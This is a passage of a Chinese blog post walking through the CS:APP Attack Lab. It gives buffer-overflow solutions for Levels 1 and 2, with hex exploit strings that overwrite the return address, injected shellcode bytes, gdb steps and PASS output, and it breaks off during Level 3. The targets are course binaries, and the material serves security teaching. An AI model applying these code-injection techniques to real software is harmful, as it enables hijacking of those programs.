@@ -1,0 +1,665 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="utf-8">
+  
+  
+  <title>Attack Lab: Understanding Buffer Overflow Bugs | ExiTalk</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+  <meta name="description" content="CS:APP–Lab assignments #3">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Attack Lab: Understanding Buffer Overflow Bugs">
+<meta property="og:url" content="http://www.superpung.xyz/Attack-Lab/">
+<meta property="og:site_name" content="ExiTalk">
+<meta property="og:description" content="CS:APP–Lab assignments #3">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="http://www.superpung.xyz/Attack-Lab/Attack-Lab/SuperPung_%E5%85%AC%E4%BC%97%E5%8F%B7.png">
+<meta property="og:image" content="http://www.superpung.xyz/Attack-Lab/Attack-Lab/Summary_of_attack_lab_phases.png">
+<meta property="og:image" content="http://www.superpung.xyz/Attack-Lab/Attack-Lab/movq%E6%8C%87%E4%BB%A4%E7%9A%84%E7%BC%96%E7%A0%81.png">
+<meta property="og:image" content="http://www.superpung.xyz/Attack-Lab/Attack-Lab/%E5%9B%BE3A-B.png">
+<meta property="og:image" content="http://www.superpung.xyz/Attack-Lab/Attack-Lab/%E5%9B%BE3B.png">
+<meta property="og:image" content="http://www.superpung.xyz/Attack-Lab/Attack-Lab/%E5%9B%BE3A.png">
+<meta property="og:image" content="http://www.superpung.xyz/Attack-Lab/Attack-Lab/%E5%9B%BE3C-D.png">
+<meta property="og:image" content="http://www.superpung.xyz/Attack-Lab/Attack-Lab/%E5%9B%BE3A.png">
+<meta property="og:image" content="http://www.superpung.xyz/Attack-Lab/Attack-Lab/%E5%9B%BE3A.png">
+<meta property="og:image" content="http://www.superpung.xyz/Attack-Lab/Attack-Lab/%E5%9B%BE3C.png">
+<meta property="og:image" content="http://www.superpung.xyz/Attack-Lab/Attack-Lab/%E5%9B%BE3D.png">
+<meta property="article:published_time" content="2020-05-08T08:49:07.000Z">
+<meta property="article:modified_time" content="2020-06-17T01:19:02.000Z">
+<meta property="article:author" content="SUPER">
+<meta property="article:tag" content="Computer Systems">
+<meta property="article:tag" content="Lab Assignments">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://www.superpung.xyz/Attack-Lab/Attack-Lab/SuperPung_%E5%85%AC%E4%BC%97%E5%8F%B7.png">
+  
+    <link rel="alternate" href="/atom.xml" title="ExiTalk" type="application/atom+xml">
+  
+  
+    <link rel="shortcut icon" href="/favicon.png">
+  
+  
+    
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/typeface-source-code-pro@0.0.71/index.min.css">
+
+  
+  
+<link rel="stylesheet" href="/css/style.css">
+
+  
+    
+<link rel="stylesheet" href="/fancybox/jquery.fancybox.min.css">
+
+  
+<meta name="generator" content="Hexo 5.3.0"></head>
+
+<body>
+  <div id="container">
+    <div id="wrap">
+      <header id="header">
+  <div id="banner"></div>
+  <div id="header-outer" class="outer">
+    <div id="header-title" class="inner">
+      <h1 id="logo-wrap">
+        <a href="/" id="logo">ExiTalk</a>
+      </h1>
+      
+        <h2 id="subtitle-wrap">
+          <a href="/" id="subtitle">Follow your heart</a>
+        </h2>
+      
+    </div>
+    <div id="header-inner" class="inner">
+      <nav id="main-nav">
+        <a id="main-nav-toggle" class="nav-icon"></a>
+        
+          <a class="main-nav-link" href="/">Home</a>
+        
+          <a class="main-nav-link" href="/archives">Archives</a>
+        
+      </nav>
+      <nav id="sub-nav">
+        
+          <a id="nav-rss-link" class="nav-icon" href="/atom.xml" title="RSS Feed"></a>
+        
+        <a id="nav-search-btn" class="nav-icon" title="Search"></a>
+      </nav>
+      <div id="search-form-wrap">
+        <form action="//google.com/search" method="get" accept-charset="UTF-8" class="search-form"><input type="search" name="q" class="search-form-input" placeholder="Search"><button type="submit" class="search-form-submit">&#xF002;</button><input type="hidden" name="sitesearch" value="http://www.superpung.xyz"></form>
+      </div>
+    </div>
+  </div>
+</header>
+
+      <div class="outer">
+        <section id="main"><article id="post-Attack-Lab" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
+  <div class="article-meta">
+    <a href="/Attack-Lab/" class="article-date">
+  <time class="dt-published" datetime="2020-05-08T08:49:07.000Z" itemprop="datePublished">2020-05-08</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 class="p-name article-title" itemprop="headline name">
+      Attack Lab: Understanding Buffer Overflow Bugs
+    </h1>
+  
+
+      </header>
+    
+    <div class="e-content article-entry" itemprop="articleBody">
+      
+        <p>CS:APP–Lab assignments #3</p>
+<a id="more"></a>
+
+<p><img src="Attack-Lab/SuperPung_%E5%85%AC%E4%BC%97%E5%8F%B7.png" alt="SuperPung_公众号"></p>
+<p><strong><em>若参考或转载请注明出处</em></strong></p>
+<p>本实验通过代码注入攻击、<a target="_blank" rel="noopener" href="https://zh.wikipedia.org/zh-cn/%E8%BF%94%E5%9B%9E%E5%AF%BC%E5%90%91%E7%BC%96%E7%A8%8B">面向返回编程（Return-Oriented Programming，ROP）</a>攻击来帮助理解缓冲区溢出的危害。你将研究CS:APP3e的第3.10.3和3.10.4节，作为该实验的参考资料。</p>
+<p>注意：</p>
+<p>在本实验中，你将获得用于利用操作系统和网络服务器中的安全漏洞的方法的第一手经验。 我们的目的是帮助你了解程序的运行时操作，并了解这些安全漏洞的性质，以便在编写系统代码时可以避免它们。 我们不容忍使用任何其他形式的攻击来获得对任何系统资源的未经授权的访问。</p>
+<p>完成此实验后：</p>
+<ul>
+<li>你将学习攻击者利用安全漏洞的不同方法，当程序不能很好地保护自己免受缓冲区溢出的侵害时；</li>
+<li>你将更好地了解如何编写更安全的程序，以及编译器和操作系统提供的一些功能，以使程序更不容易受到攻击；</li>
+<li>你将对x86-64机器代码的堆栈和参数传递机制有更深入的了解；</li>
+<li>你将对x86-64指令的编码方式有更深入的了解；</li>
+<li>你将获得有关调试工具（例如<code>gdb</code>和<code>objdump</code>）的更多经验。</li>
+</ul>
+<p>以下是有关此实验有效解决方案的一些重要规则的摘要。 当你第一次阅读本文档时，这些要点没有多大意义。 一旦开始，它们将在此处作为规则的主要参考。</p>
+<ul>
+<li>你必须在与生成<code>target</code>的计算机相似的计算机上进行此实验。</li>
+<li>你的解决方案可能不会使用攻击来规避程序中的验证代码。 具体来说，你将任何包含在<code>ret</code>指令中的攻击字符串中的地址都应指向以下目标之一：<ul>
+<li>函数<code>touch1</code>、<code>touch2</code>或<code>touch3</code>的地址。</li>
+<li>你注入的代码的地址。</li>
+<li>来自<code>gadget farm</code>的一个<code>gadget</code>的地址。</li>
+</ul>
+</li>
+<li>你只能从文件<code>rtarget</code>构造<code>gadget</code>，其地址范围介于函数<code>start_farm</code>和<code>end_farm</code>之间。</li>
+</ul>
+<p>本文所有操作均基于以下环境：</p>
+<ul>
+<li>OS: Ubuntu 18.04.4 LTS (Linux ubuntu 5.3.0-46-generic x86_64)</li>
+<li>Debugger: GNU gdb (Ubuntu 8.1-0ubuntu3.2) 8.1.0.20180409-git</li>
+<li>Compiler: gcc version 7.5.0</li>
+</ul>
+<p><em>有关实验的基本介绍参见实验说明（公众号后台回复“<code>attack lab</code>”即可下载）。</em></p>
+<h1 id="准备"><a href="#准备" class="headerlink" title="准备"></a>准备</h1><p>阅读<code>README.txt</code>，可以发现：</p>
+<ul>
+<li><p><code>ctarget</code>：易受代码注入攻击的可执行程序（对应Part I即课程要求部分）；</p>
+</li>
+<li><p><code>rtarget</code>：易受ROP攻击的可执行程序（对应Part II）；</p>
+</li>
+<li><p><code>cookie.txt</code>：8位十六进制代码<code>cookie</code>，你将在攻击中将其用作唯一标识符；</p>
+</li>
+<li><p><code>farm.c</code>：目标的<code>gadget farm</code>的源代码，将用于ROP攻击；</p>
+</li>
+<li><p><code>hex2raw</code>：用于生成攻击字符串的实用程序。</p>
+</li>
+</ul>
+<p><em>若完成课程要求部分，则只需用到 <code>ctarget</code>、<code>cookie.txt</code>和<code>hex2raw</code>。</em></p>
+<p>下图总结了实验的五个阶段。可以看出，前三个涉及对<code>catrget</code>的代码注入（CI）攻击（课程要求），而后两个涉及对<code>rtarget</code>的面向返回编程（ROP）攻击（课程未做要求）。<img src="Attack-Lab/Summary_of_attack_lab_phases.png" alt="Summary_of_attack_lab_phases"></p>
+<p><code>ctarget</code>和<code>rtarget</code>都从标准输入读取字符串，二者都采用几个不同的命令行参数：</p>
+<ul>
+<li><code>-h</code>：打印可能的命令行参数列表</li>
+<li><code>-q</code>：不将结果发送到评分服务器（自学者<strong>必须</strong>在运行时加上此参数，否则会由于服务器不存在而报错）</li>
+<li><code>-i &lt;FILE&gt;</code>：从文件而不是标准输入提供输入</li>
+</ul>
+<p>与<code>Bomb Lab</code>不同，在此实验犯错误不会受到任何惩罚。 随意使用你喜欢的任何字符串向<code>ctarget</code>和<code>rtarget</code>开火。</p>
+<h1 id="Part-I-Code-Injection-Attacks"><a href="#Part-I-Code-Injection-Attacks" class="headerlink" title="Part I: Code Injection Attacks"></a>Part I: Code Injection Attacks</h1><blockquote>
+<p>在前三个阶段中，你将<strong>利用字符串攻击<code>ctarget</code>**。设置该程序的方式是，从一次运行到下一次运行，堆栈位置将保持一致，以便将堆栈上的数据视为可执行代码。这些功能使程序容易受到攻击，当你利用</strong>包含可执行代码的字节编码<strong>（机器码，即汇编文件中地址右侧的若干字节）</strong>的字符串**时。</p>
+</blockquote>
+<h2 id="Level-1"><a href="#Level-1" class="headerlink" title="Level 1"></a>Level 1</h2><blockquote>
+<p>对于<code>level 1</code>，你将不会注入新代码。 相反，你将<strong>利用字符串重定向程序</strong>以执行现有过程。</p>
+<p><code>ctarget</code>中的<code>test</code>函数调用了<code>getbuf</code>函数：</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">test</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> val;</span><br><span class="line">  val = getbuf();</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;No exploit. Getbuf returned 0x%x\n&quot;</span>, val);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">unsigned</span> <span class="title">getbuf</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> buf[BUFFER_SIZE];</span><br><span class="line">  Gets(buf);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>当<code>getbuf</code>执行其<code>return</code>语句（<code>getbuf</code>的第5行）时，程序通常会返回到<code>test</code>（第5行）内恢复执行。 我们想改变这种行为。 在文件<code>ctarget</code>中，存在<code>touch1</code>函数：</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">touch1</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  vlevel = <span class="number">1</span>; <span class="comment">/* Part of validation protocol */</span></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Touch1!: You called touch1()\n&quot;</span>);</span><br><span class="line">  validate(<span class="number">1</span>);</span><br><span class="line">  <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>你的任务是**让<code>ctarget</code>在<code>getbuf</code>执行<code>return</code>语句时执行<code>touch1</code>的代码，而不是返回<code>test</code>**。 请注意，你的字符串可能还会破坏与该阶段不直接相关的堆栈部分，但这不会引起问题，因为<code>touch1</code>会导致程序直接退出。</p>
+<p>一些忠告：</p>
+<ul>
+<li>你可以通过检查反汇编的<code>ctarget</code>来确定为此<code>level</code>设计字符串所需的所有信息。请使用<code>objdump -d</code>获取此反汇编的代码。</li>
+<li>思路是在字符串中放置<code>touch1</code>起始地址的字节表示，以便<code>getbuf</code>代码末尾的<code>ret</code>指令将控制权转移到<code>touch1</code>。</li>
+<li>注意字节顺序。</li>
+<li>你可能希望使用<code>gdb</code>在<code>getbuf</code>的最后几条指令中逐步执行该程序，以确保它在做正确的事情。</li>
+<li><code>buf</code>在<code>getbuf</code>的堆栈帧中的放置取决于编译时常量<code>BUFFER_SIZE</code>的值以及<code>gcc</code>使用的分配策略。 你将需要检查反汇编的代码以确定其位置。</li>
+</ul>
+</blockquote>
+<p>目的就是用字符串将<code>getbuf</code>函数重定向执行<code>touch1</code>函数。</p>
+<p>首先利用<code>objdump</code>工具反汇编，并将结果重定向存入<code>ctarget.s</code>文件以便分析。</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">objdump -d ctarget &gt; ctarget.s</span><br></pre></td></tr></table></figure>
+<hr>
+<p>观察<code>test</code>函数：</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">test</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> val;</span><br><span class="line">  val = getbuf();</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;No exploit. Getbuf returned 0x%x\n&quot;</span>, val);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p><code>getbuf</code>函数：</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">unsigned</span> <span class="title">getbuf</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> buf[BUFFER_SIZE];</span><br><span class="line">  Gets(buf);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>发现<code>getbuf</code>函数第4行调用<code>Gets</code>读取输入的字符串并存入<code>buf</code>中，而<code>buf</code>只分配了<code>BUFFER_SIZE</code>大小的内存，所以存在缓冲区溢出漏洞。若要详细了解<code>getbuf</code>函数，则可以在<code>ctarget.s</code>中找到<code>getbuf</code>函数对应的汇编语句：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">00000000004017a8 &lt;getbuf&gt;:</span><br><span class="line">  4017a8:	48 83 ec 28          	sub    $0x28,%rsp</span><br><span class="line">  ...</span><br><span class="line">  4017b9:	48 83 c4 28          	add    $0x28,%rsp</span><br><span class="line">  4017bd:	c3                   	retq   </span><br><span class="line">  ...</span><br></pre></td></tr></table></figure>
+<p>4017a8分配了40字节大小的空间，可知<code>BUFFER_SIZE</code>的值为40。也就是说，<strong>当输入字符串长度超过40就会发生缓冲区溢出，而且溢出的部分就会覆盖掉原来的返回地址</strong>。</p>
+<p>根据这个思路，我们可以首先输入40个字符，再输入8个字符作为溢出部分，而这8个字符就是要跳转到的<code>touch1</code>函数的地址。（<strong>地址均为8字节</strong>）</p>
+<hr>
+<p>为获得<code>touch1</code>函数的地址，在<code>ctarget.s</code>中找到<code>touch1</code>函数对应的汇编语句：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">00000000004017c0 &lt;touch1&gt;:</span><br><span class="line">  ...</span><br></pre></td></tr></table></figure>
+<p>可以看到<code>touch1</code>函数的地址为<code>0x4017c0</code>，这就是我们要输入的字符串末尾的字符。</p>
+<hr>
+<p><span id = "hex2rawq"><a href="#hex2raw">如何得到我们要输入的字符串？</a></span></p>
+<p>首先编辑用于攻击的字符串文件<code>exploit.txt</code>，同时注意<strong>机器为小端法（little endian）时地址的字节序问题</strong>（前40个字符任意输入）：</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">00 00 00 00 00 00 00 00</span><br><span class="line">00 00 00 00 00 00 00 00</span><br><span class="line">00 00 00 00 00 00 00 00</span><br><span class="line">00 00 00 00 00 00 00 00</span><br><span class="line">00 00 00 00 00 00 00 00</span><br><span class="line">c0 17 40 00 00 00 00 00 /* address of touch1 */</span><br></pre></td></tr></table></figure>
+<p>再将保存的<code>exploit.txt</code>输入到<code>ctarget</code>：</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat exploit.txt | ./hex2raw | ./ctarget -q</span><br></pre></td></tr></table></figure>
+<p>得到输出如下：</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">Cookie: 0x59b997fa</span><br><span class="line">Type string:Touch1!: You called touch1()</span><br><span class="line">Valid solution for level 1 with target ctarget</span><br><span class="line">PASS: Would have posted the following:</span><br><span class="line">        user id bovik</span><br><span class="line">        course  15213-f15</span><br><span class="line">        lab     attacklab</span><br><span class="line">        result  1:PASS:0xffffffff:ctarget:1:00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 C0 17 40 00 00 00 00 00 </span><br></pre></td></tr></table></figure>
+<p>完成。</p>
+<h2 id="Level-2"><a href="#Level-2" class="headerlink" title="Level 2"></a>Level 2</h2><blockquote>
+<p><code>level 2</code>涉及<strong>注入少量代码</strong>作为字符串的一部分。</p>
+<p><code>ctarget</code>中有<code>touch2</code>函数：</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">touch2</span><span class="params">(<span class="keyword">unsigned</span> val)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  vlevel = <span class="number">2</span>; <span class="comment">/* Part of validation protocol */</span></span><br><span class="line">  <span class="keyword">if</span> (val == cookie) &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Touch2!: You called touch2(0x%.8x)\n&quot;</span>, val);</span><br><span class="line">    validate(<span class="number">2</span>); </span><br><span class="line">  &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Misfire: You called touch2(0x%.8x)\n&quot;</span>, val);</span><br><span class="line">    fail(<span class="number">2</span>); </span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">exit</span>(<span class="number">0</span>); </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>你的任务是**让<code>ctarget</code>重定向至<code>touch2</code>并进入<code>validate</code>分支，而不是返回<code>test</code>**。</p>
+<p>一些忠告：</p>
+<ul>
+<li>你将希望以某种方式在字符串中放置注入代码的地址的字节表示，以使<code>getbuf</code>代码末尾的<code>ret</code>指令将控制权转移给它。</li>
+<li>回想一下，函数的第一个参数在寄存器<code>％rdi</code>中传递。</li>
+<li>你注入的代码应将寄存器设置为<code>cookie</code>，然后使用<code>ret</code>指令进行转移控制到<code>touch2</code>中的第一条指令。</li>
+<li>请勿尝试在代码中使用<code>jmp</code>或调用指令。 这些指令的目标地址的编码很难确定。 对于所有控制转移，请使用<code>ret</code>指令，即使你不是从调用处返回也是如此。</li>
+<li>如何使用工具生成指令序列的字节级表示形式？</li>
+</ul>
+</blockquote>
+<p>目的就是用字符串执行<code>touch2</code>函数，并使参数<code>val</code>等于<code>cookie</code>值。</p>
+<p>和<code>level 1</code>类似，依然需要利用<code>getbuf</code>的缓冲区溢出漏洞，只不过在重定向至<code>touch2</code>之前需要将<code>cookie</code>值传入<code>％rdi</code>寄存器（函数的第一个参数）。</p>
+<p>实现这个功能，造成了与<code>level 1</code>的不同之处——需要在编写的汇编代码中实现传入<code>cookie</code>值、返回到<code>touch2</code>这两个功能，而如何才能让程序执行我们编写的这段代码？因为可以将缓冲区溢出部分设置为任意地址来实现跳转，而且这段代码就存放于缓冲区中，所以可以将缓冲区溢出部分设置为<strong>缓冲区（<code>%rsp</code>）的起始地址</strong>，这样就可以跳转到我们编写的这段代码了。</p>
+<hr>
+<p>明确思路后，寻找<code>touch2</code>地址：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">00000000004017ec &lt;touch2&gt;:</span><br><span class="line">  ...</span><br></pre></td></tr></table></figure>
+<p>为<code>0x4017ec</code>。</p>
+<hr>
+<p>编写汇编代码（<strong>注意末尾的空行</strong>）并保存为<code>touch2.s</code>文件：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">mov    $0x59b997fa,%rdi    # cookie</span><br><span class="line">push   $0x4017ec           # touch2</span><br><span class="line">ret</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<p>先传入<code>cookie</code>值，再将<code>touch2</code>地址压入栈中，执行<code>ret</code>时弹栈返回。由于栈的后进先出特点，返回地址即为后压入栈中的<code>0x4017ec</code>。</p>
+<hr>
+<p><span id ="generateq"><a href="#generate">如何将汇编代码转换成字节码（机器码）？</a></span></p>
+<p>将<code>touch2.s</code>文件进行汇编：</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gcc -c touch2.s</span><br></pre></td></tr></table></figure>
+<p>反汇编：</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">objdump -d touch2.o</span><br></pre></td></tr></table></figure>
+<p>得到输出如下：</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">touch2.o：     文件格式 elf64-x86-64</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Disassembly of section .text:</span><br><span class="line"></span><br><span class="line">0000000000000000 &lt;.text&gt;:</span><br><span class="line">   0:   48 c7 c7 fa 97 b9 59    mov    $0x59b997fa,%rdi</span><br><span class="line">   7:   68 ec 17 40 00          pushq  $0x4017ec</span><br><span class="line">   c:   c3                      retq </span><br></pre></td></tr></table></figure>
+<p>至此，得到了汇编语句对应的字节码：</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">48 c7 c7 fa 97 b9 59    /* mov    $0x59b997fa,%rdi */</span><br><span class="line">68 ec 17 40 00          /* pushq  $0x4017ec */</span><br><span class="line">c3                      /* retq */</span><br></pre></td></tr></table></figure>
+<hr>
+<p>接下来，寻找缓冲区<code>%rsp</code>的起始地址，利用<code>gdb</code>：</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gdb ctarget</span><br></pre></td></tr></table></figure>
+<p>打断点：</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(gdb) b getbuf</span><br></pre></td></tr></table></figure>
+<p>运行：</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(gdb) r -q</span><br></pre></td></tr></table></figure>
+<p>单步跟踪：</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(gdb) si</span><br></pre></td></tr></table></figure>
+<p>此时执行到<code>4017a8: sub $0x28,%rsp</code>处，打印<code>%rsp</code>的值（地址）：</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(gdb) p/x $rsp</span><br></pre></td></tr></table></figure>
+<p>得到输出如下：</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash">1 = 0x5561dc78</span></span><br></pre></td></tr></table></figure>
+<p>即<code>%rsp</code>的值为<code>0x5561dc78</code>，此即缓冲区的起始地址。</p>
+<hr>
+<p>和<code>level 1</code>类似，编辑用于攻击的字符串文件<code>exploit.txt</code>（<strong>注意注释周围的空格</strong>）：</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">48 c7 c7 fa 97 b9 59 /* mov    $0x59b997fa,%rdi */</span><br><span class="line">68 ec 17 40 00 /* pushq  $0x4017ec */</span><br><span class="line">c3 /* retq */</span><br><span class="line">00 00 00</span><br><span class="line">00 00 00 00 00 00 00 00</span><br><span class="line">00 00 00 00 00 00 00 00</span><br><span class="line">00 00 00 00 00 00 00 00</span><br><span class="line">78 dc 61 55 00 00 00 00 /* address of %rsp in getbuf */</span><br></pre></td></tr></table></figure>
+<p>再将保存的<code>exploit.txt</code>输入到<code>ctarget</code>：</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat exploit.txt | ./hex2raw | ./ctarget -q</span><br></pre></td></tr></table></figure>
+<p>得到输出如下：</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">Cookie: 0x59b997fa</span><br><span class="line">Type string:Touch2!: You called touch2(0x59b997fa)</span><br><span class="line">Valid solution for level 2 with target ctarget</span><br><span class="line">PASS: Would have posted the following:</span><br><span class="line">        user id bovik</span><br><span class="line">        course  15213-f15</span><br><span class="line">        lab     attacklab</span><br><span class="line">        result  1:PASS:0xffffffff:ctarget:2:48 C7 C7 FA 97 B9 59 68 EC 17 40 00 C3 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 78 DC 61 55 00 00 00 00 </span><br></pre></td></tr></table></figure>
+<p>完成。</p>
+<h2 id="Level-3"><a href="#Level-3" class="headerlink" title="Level 3"></a>Level 3</h2><blockquote>
+<p><code>level 3</code>还涉及<strong>代码注入攻击</strong>，但<strong>传递字符串</strong>作为参数。</p>
+<p><code>ctarget</code>中有<code>hexmatch</code>函数和<code>touch3</code>函数：</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* Compare string to hex represention of unsigned value */</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">hexmatch</span><span class="params">(<span class="keyword">unsigned</span> val, <span class="keyword">char</span> *sval)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> cbuf[<span class="number">110</span>];</span><br><span class="line">  <span class="comment">/* Make position of check string unpredictable */</span></span><br><span class="line">  <span class="keyword">char</span> *s = cbuf + random() % <span class="number">100</span>;</span><br><span class="line">  <span class="built_in">sprintf</span>(s, <span class="string">&quot;%.8x&quot;</span>, val);</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">strncmp</span>(sval, s, <span class="number">9</span>) == <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">touch3</span><span 